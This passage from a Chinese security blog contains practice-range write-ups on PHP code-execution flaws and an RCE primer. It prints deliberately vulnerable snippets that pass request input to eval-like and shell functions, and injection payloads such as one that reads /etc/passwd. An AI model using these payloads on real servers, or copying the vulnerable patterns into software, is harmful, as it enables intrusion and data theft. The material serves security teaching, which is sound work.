call_user_func_array</h2><p>和03肉眼可见的相似</p><p>实际上也是相似的<br><a href="https://blog.csdn.net/huaweichenai/article/details/110670301">call_user_func 与 call_user_func_array</a></p><p><img src="https://pic.imgdb.cn/item/66a89390d9c307b7e9ec15d9.png" alt=""></p><h2 id="05-create-function"><a href="#05-create-function" class="headerlink" title="05 create_function"></a>05 create_function</h2><p>php内置函数，用于创建lambda匿名函数的</p><blockquote><blockquote><p>string create_function ( $args, $code )</p><p>参数：该函数接受以下两个参数：<br>$args:它是一个字符串类型的函数参数。<br>$code:它是字符串类型的函数代码。</p></blockquote></blockquote><p>注意：通常，这些参数将作为单引号分隔的字符串传递。使用单引号引起来的字符串的原因是为了防止变量名被解析，否则，将需要双引号来转义变量名，例如\ $avar。</p><p>返回值：此函数以字符串形式返回唯一的函数名称，否则，在错误时返回FALSE。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  require_once(&#x27;../header.php&#x27;);?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">                &lt;title&gt;代码执行漏洞&lt;/title&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;h2&gt;代码执行漏洞create_function函数示例&lt;/h2&gt;</span><br><span class="line">                &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                        &lt;p&gt;/05.php?id=1;&#125;phpinfo();/*&lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        if(isset($_GET[&#x27;id&#x27;]))&#123;</span><br><span class="line"></span><br><span class="line">                $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">                $code = &#x27;echo &#x27;.$func.&#x27;test&#x27;.$id.&#x27;;&#x27;;</span><br><span class="line">                create_function(&#x27;$func&#x27;,$code);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                exit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>将 $_GET[‘id’] 的值赋给变量 $id。</p><p>构建一个字符串 $code，其中包含了将要创建的匿名函数的代码。这个代码使用了 $func 变量和 $id 变量。</p><p>使用 create_function 函数创建一个匿名函数，这个函数的参数是 $func，函数体是 $code 中定义的代码。</p></blockquote><p>get方式传参<br><code>?id=1;&#125;echo(`cat /etc/passwd`);/*</code></p><p><img src="https://pic.imgdb.cn/item/66a895b7d9c307b7e9ee0ba7.png" alt=""></p><h2 id="06-array-map"><a href="#06-array-map" class="headerlink" title="06 array_map"></a>06 array_map</h2><p>array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。<br>回调函数接受的参数数目应该和传递给 array_map() 函数的数组数目一致。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  require_once(&#x27;../header.php&#x27;);?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">                &lt;title&gt;代码执行漏洞&lt;/title&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;h2&gt;代码执行漏洞array_map函数示例&lt;/h2&gt;</span><br><span class="line">                &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                        &lt;p&gt;/06.php?func=system&amp;argv=id&lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        if(isset($_GET[&#x27;func&#x27;])||isset($_GET[&#x27;argv&#x27;]))&#123;</span><br><span class="line"></span><br><span class="line">                $func=$_GET[&#x27;func&#x27;];</span><br><span class="line">                $argv=$_GET[&#x27;argv&#x27;];</span><br><span class="line">                $array[0]=$argv;</span><br><span class="line">                array_map($func,$array);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                exit();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><blockquote><p>首先，通过 isset($_GET[‘func’]) || isset($_GET[‘argv’]) 检查是否存在 func 或 argv 参数。</p><p>如果这两个参数中至少有一个存在，将获取它们的值分别赋给 $func 和 $argv 变量。</p><p>接着，将 $argv 的值存入数组 $array 的第一个元素。</p><p>最后，使用 array_map() 函数，以 $func 为回调函数，对 $array 数组的每个元素调用一次回调函数。</p></blockquote><p><img src="https://pic.imgdb.cn/item/66a89681d9c307b7e9eeb6e5.png" alt=""></p><h2 id="07-preg-replace"><a href="#07-preg-replace" class="headerlink" title="07 preg_replace"></a>07 preg_replace</h2><p>执行一个正则表达式的搜索和替换</p><blockquote><p>mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</p><p>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</p><p>参数说明：</p><ul><li>$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</li><li>$replacement: 用于替换的字符串或字符串数组。</li><li>$subject: 要搜索替换的目标字符串或字符串数组。</li><li>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</li><li>$count: 可选，为替换执行的次数。</li></ul><p>返回值</p><p>如果 subject 是一个数组， preg_replace() 返回一个数组， 其他情况下返回一个字符串。</p><p>如果匹配被查找到，替换后的 subject 被返回，其他情况下 返回没有改变的 subject。如果发生错误，返回 NULL。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  require_once(&#x27;../header.php&#x27;);?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">                &lt;title&gt;代码执行漏洞&lt;/title&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;h2&gt;代码执行漏洞preg_replace无漏洞函数示例&lt;/h2&gt;</span><br><span class="line">                &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                        &lt;p&gt;/07.php?name=tom&lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        if(isset($_GET[&quot;name&quot;]))&#123;</span><br><span class="line">           $subject= &#x27;hello hack&#x27;;</span><br><span class="line">           $pattern = &#x27;/hack/&#x27;;</span><br><span class="line">           $replacement = $_GET[&quot;name&quot;];</span><br><span class="line">           echo preg_replace($pattern, $replacement, $subject);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                exit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/66a8978dd9c307b7e9efc381.png" alt=""></p><p>其实他给的是无漏洞的，他已经严格的包裹了，这样的话你访问<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.159.137/execcode/07.php?name=phpinfo();</span><br></pre></td></tr></table></figure></p><p>只能得到<br><img src="https://pic.imgdb.cn/item/66a8988dd9c307b7e9f0b385.png" alt=""></p><h2 id="08-preg-replace"><a href="#08-preg-replace" class="headerlink" title="08 preg_replace"></a>08 preg_replace</h2><p>但是你只要稍做手脚<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  require_once(&#x27;../header.php&#x27;);?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">                &lt;title&gt;代码执行漏洞&lt;/title&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;h2&gt;代码执行漏洞preg_replace无漏洞函数示例&lt;/h2&gt;</span><br><span class="line">                &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                        &lt;p&gt;/07.php?name=tom&lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        if(isset($_GET[&quot;name&quot;]))&#123;</span><br><span class="line">           $subject= &#x27;hello hack&#x27;;</span><br><span class="line">           $pattern = &#x27;/hack/e&#x27;;</span><br><span class="line">           $replacement = $_GET[&quot;name&quot;];</span><br><span class="line">           echo preg_replace($pattern, $replacement, $subject);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                exit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>在hack后面加一个e就可以</p><p><img src="https://pic.imgdb.cn/item/66a898a3d9c307b7e9f0c3fd.png" alt=""></p><h2 id="09-可变函数"><a href="#09-可变函数" class="headerlink" title="09 可变函数"></a>09 可变函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  require_once(&#x27;../header.php&#x27;);?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">        &lt;head&gt;</span><br><span class="line">                &lt;title&gt;代码执行漏洞&lt;/title&gt;</span><br><span class="line">        &lt;/head&gt;</span><br><span class="line">        &lt;h2&gt;可变函数漏洞示例01&lt;/h2&gt;</span><br><span class="line">                &lt;div class=&quot;alert alert-success&quot;&gt;</span><br><span class="line">                        &lt;p&gt;/09.php?func=func1&lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">        &lt;body&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">        if(isset($_REQUEST[&#x27;func&#x27;]))&#123;</span><br><span class="line">                function func1() &#123;</span><br><span class="line">                        echo &quot;func1函数&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                function func2($arg = &#x27;&#x27;) &#123;</span><br><span class="line">                        echo &quot;func2函数&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                $func = $_REQUEST[&#x27;func&#x27;];</span><br><span class="line">                        echo $func();</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">                exit();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>func等于多少就返回啥<br><code>func=phpinfo</code><br><img src="https://pic.imgdb.cn/item/66a89968d9c307b7e9f171f5.png" alt=""></p><h2 id="10-可变函数"><a href="#10-可变函数" class="headerlink" title="10 可变函数"></a>10 可变函数</h2><p><img src="https://pic.imgdb.cn/item/66a89968d9c307b7e9f1720e.png" alt=""></p><h2 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h2><p>顺便补充一下回调函数<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// 回调函数示例</span><br><span class="line">function processNumbers($numbers, $callback) &#123;</span><br><span class="line">    $result = array_map($callback, $numbers);</span><br><span class="line">    return $result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 回调函数1：将每个数字平方</span><br><span class="line">function square($num) &#123;</span><br><span class="line">    return $num * $num;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 回调函数2：将每个数字加倍</span><br><span class="line">function double($num) &#123;</span><br><span class="line">    return $num * 2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 数字数组</span><br><span class="line">$numbers = [1, 2, 3, 4, 5];</span><br><span class="line"></span><br><span class="line">// 使用回调函数1：将每个数字平方</span><br><span class="line">$squaredNumbers = processNumbers($numbers, &#x27;square&#x27;);</span><br><span class="line">print_r($squaredNumbers);</span><br><span class="line"></span><br><span class="line">// 使用回调函数2：将每个数字加倍</span><br><span class="line">$doubledNumbers = processNumbers($numbers, &#x27;double&#x27;);</span><br><span class="line">print_r($doubledNumbers);</span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">processNumbers 函数：</span><br><span class="line">processNumbers 函数接受两个参数：一个数字数组 $numbers 和一个回调函数 $callback。</span><br><span class="line">在函数内部，它使用 array_map() 函数来将回调函数应用于数组中的每个元素。</span><br><span class="line">最后，它返回应用回调函数后得到的结果数组。</span><br><span class="line">回调函数：</span><br><span class="line">square 函数和 double 函数是作为回调函数传递给 processNumbers 函数的。</span><br><span class="line">square 函数实现了将输入数字平方的操作。</span><br><span class="line">double 函数实现了将输入数字加倍的操作。</span><br><span class="line">应用回调函数：</span><br><span class="line">通过将不同的回调函数（square 或 double）作为参数传递给 processNumbers 函数，我们能够根据需要选择不同的操作。</span><br><span class="line">当我们使用 processNumbers($numbers, &#x27;square&#x27;) 时，会将每个数字平方，并返回平方后的结果数组。</span><br><span class="line">当我们使用 processNumbers($numbers, &#x27;double&#x27;) 时，会将每个数字加倍，并返回加倍后的结果数组。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> iwebsec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RCE</title>
      <link href="/2025/01/08/2024%E5%B9%B47%E6%9C%8826%E6%97%A5-rce/"/>
      <url>/2025/01/08/2024%E5%B9%B47%E6%9C%8826%E6%97%A5-rce/</url>
      
        <content type="html"><![CDATA[<h1 id="rce"><a href="#rce" class="headerlink" title="rce"></a>rce</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>rce是指服务器没有对执行的命令进行过滤，用户可以任意的调用系统命令</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>应用程序有时需要调用一些执行系统命令的函数,如在PHP中，使用<code>system、exec、shell_exec、passthru、popen、proc_popen</code>等函数可以执行系统命令，当黑客能控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行</p><h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>可以继承web服务器权限，反弹shell</p><h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><ul><li>过滤不严</li><li>系统存在漏洞</li><li>第三方插件</li></ul><h2 id="rce何代码执行的区别"><a href="#rce何代码执行的区别" class="headerlink" title="rce何代码执行的区别"></a>rce何代码执行的区别</h2><ul><li>代码执行：执行效果完全依赖于语言本身</li><li>命令执行：执行效果不受语言本身、命令本身的限制</li></ul><h2 id="常见的危险函数"><a href="#常见的危险函数" class="headerlink" title="常见的危险函数"></a>常见的危险函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">1. php代码相关</span><br><span class="line">  eval()</span><br><span class="line">  assert()</span><br><span class="line">  preg_replace</span><br><span class="line">  call_user_func()</span><br><span class="line">  call_user_func_array()</span><br><span class="line">  create_function</span><br><span class="line">  array_map()</span><br><span class="line">2. 系统命令执行相关</span><br><span class="line">  system()</span><br><span class="line">  passthru()</span><br><span class="line">  exec()</span><br><span class="line">  pcntl_exec()</span><br><span class="line">  shell_exec()</span><br><span class="line">  popen()</span><br><span class="line">  proc_open()</span><br><span class="line">  `(反单引号)</span><br><span class="line">  ob_start()</span><br><span class="line">3. 特殊函数</span><br><span class="line">  phpinfo()</span><br><span class="line">  #这个文件里面包含了PHP的编译选项，启动的扩展、版本、服务器配置信息、环境变量、操作系统信息、path变量等非常重要的敏感配置信息</span><br><span class="line">  symlink()：</span><br><span class="line">  #一般是在linux服务器上使用的，为一个目标建立一个连接，在读取这个链接所连接的文件的内容，并返回内容</span><br><span class="line">  getenv</span><br><span class="line">  #获取一个环境变量的值</span><br><span class="line">  putenv($a)</span><br><span class="line">  #添加$a到服务器环境变量，但环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态</span><br></pre></td></tr></table></figure><h2 id="危险函数调用"><a href="#危险函数调用" class="headerlink" title="危险函数调用"></a>危险函数调用</h2><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><figure class="highlight plaintext"><figcaption><span>--执行外部程序并且显示输出</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">用法：```system(string $command,int &amp;$return_var=?):string```</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>system:函数名字<br>string $command表示这个函数的第一个参数是一个string类型的字符串<br>&amp;$return_var没有错，&amp;表示的是这个参数是通过引用传递的<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">引用传递</span><br><span class="line">就是通过引用传递函数可以让函数修改调用者传递进来的变量的值。</span><br><span class="line">```简单的例子</span><br><span class="line">&lt;?php</span><br><span class="line">// 定义一个函数，接受一个整数参数通过引用传递</span><br><span class="line">function doubleValue(&amp;$num) &#123;</span><br><span class="line">    $num *= 2; // 将传递进来的参数乘以2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 定义一个变量</span><br><span class="line">$value = 10;</span><br><span class="line"></span><br><span class="line">// 调用函数，传递变量 $value 作为参数</span><br><span class="line">doubleValue($value);</span><br><span class="line"></span><br><span class="line">// 输出变量 $value 的值，应为原来的值乘以2</span><br><span class="line">echo $value; // 输出 20</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>在这个示例中，<code>doubleValue</code> 函数接受一个参数 <code>$num</code>，这个参数通过引用传递（使用 &amp; 符号）。在函数内部，参数 <code>$num</code> 的值被乘以2。当在调用代码中将变量 <code>$value</code> 传递给函数时，函数修改了这个变量的值，使得最终输出结果为 20。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_REQUEST[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = ($_REQUEST[&#x27;url&#x27;]);</span><br><span class="line">    $b = system($url, $a);</span><br><span class="line">    echo $a.PHP_EOL;</span><br><span class="line">    echo $b.PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这里调用system函数获取了url的数值进行,php_eol是换行符</p><pre><code class="lang-执行url=dir```">[![pkbTI41.png](https://s21.ax1x.com/2024/07/26/pkbTI41.png)](https://imgse.com/i/pkbTI41)### passthru<figure class="highlight plaintext"><figcaption><span>-- 执行外部程序并且显示原始输出</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">用法：```passthru(string $command,int &amp;$return_var=?):void```</span><br><span class="line">```passthru</span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_REQUEST[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = ($_REQUEST[&#x27;url&#x27;]);</span><br><span class="line">    passthru($url,$a);</span><br><span class="line">    echo $a.PHP_EOL;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>执行命令```?url=dir &gt; 22.txt</code></pre><p><a href="https://imgse.com/i/pkbTT9x"><img src="https://s21.ax1x.com/2024/07/26/pkbTT9x.png" alt="pkbTT9x.png"></a></p><h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><figure class="highlight plaintext"><figcaption><span>--执行一个外部程序</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```exec(string $commadn,array &amp;$output=?,int &amp;$return_var=?):string```</span><br><span class="line"></span><br><span class="line">```exec</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_REQUEST[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = ($_REQUEST[&#x27;url&#x27;]);</span><br><span class="line">    echo exec($url);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=echo falgistrue &gt; 222.txt</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pkb798P"><img src="https://s21.ax1x.com/2024/07/26/pkb798P.png" alt="pkb798P.png"></a></p><h3 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h3><p><code>shell_exec(string $cmd ):string</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_REQUEST[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = ($_REQUEST[&#x27;url&#x27;]);</span><br><span class="line">    echo shell_exec($url);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo falgistrue &gt; 221.txt</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/pkb7GVJ"><img src="https://s21.ax1x.com/2024/07/26/pkb7GVJ.png" alt="pkb7GVJ.png"></a></p><h3 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_REQUEST[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = ($_REQUEST[&#x27;url&#x27;]);</span><br><span class="line">    echo `$url`;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="OS命令执行"><a href="#OS命令执行" class="headerlink" title="OS命令执行"></a>OS命令执行</h2><h3 id="windows支持的管道符"><a href="#windows支持的管道符" class="headerlink" title="windows支持的管道符"></a>windows支持的管道符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">|</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接执行后面的语句，不管前面的是否可以</p><p><a href="https://imgse.com/i/pkbH3SP"><img src="https://s21.ax1x.com/2024/07/26/pkbH3SP.png" alt="pkbH3SP.png"></a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">||</span><br></pre></td></tr></table></figure><p>前面的语句执行错误才可以执行后面的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;</span><br></pre></td></tr></table></figure><p>如果前面的语句为假则直接执行后面的语句，前面的语句可真可假</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;&amp;</span><br></pre></td></tr></table></figure><p>如果前面的语句为真先执行第一个命令后执行第二个命令；为假则直接出错，也不执行后面的语句</p><h3 id="linux支持的管道符"><a href="#linux支持的管道符" class="headerlink" title="linux支持的管道符"></a>linux支持的管道符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;</span><br></pre></td></tr></table></figure><p>执行完前面的执行后面的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">|,||,&amp;,&amp;&amp;</span><br></pre></td></tr></table></figure><p>等于windows的</p><h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><p>Java SE 中，存在Runtime 类，在该类中提供了exec 方法用以在单独的进程中执行指定的字符串命令，像JSP、Servlet、 Struts、 Spring、 Hibernate 等技术一般执行外部程序都会调用此方法（或者使用ProcessBuilder类，但较少）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 